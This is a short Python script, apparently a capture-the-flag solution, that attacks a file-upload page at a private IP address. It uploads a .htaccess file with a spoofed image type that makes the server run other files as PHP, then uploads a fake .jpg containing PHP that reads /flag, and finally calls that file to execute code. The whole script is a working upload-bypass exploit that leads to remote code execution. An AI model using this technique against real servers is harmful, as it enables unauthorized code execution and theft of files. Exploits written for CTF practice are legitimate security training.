import requests
proxies = {
  'http': 'http://proxy2.dq.petrochina:8080',
  'https': 'http://proxy2.dq.petrochina:8080',
}

# requests.get('http://example.org', proxies=proxies)

url = "http://172.21.4.12:10011/"
session = requests.session()
htaccess = {'uploaded': ('.htaccess', "SetHandler application/x-httpd-php", 'image/jpeg')}
res_hta = session.post(url, files=htaccess)

files = {'uploaded': ('123.jpg', "<script language=\"php\">echo file_get_contents(\"/flag\");</script>", 'image/jpeg')}
res_jpg = session.post(url, files=files)

res_shell = session.post(url + res_jpg.text[-69:-22], data = {'a':'echo file_get_contents(\'/flag\');'})

print(res_shell.text)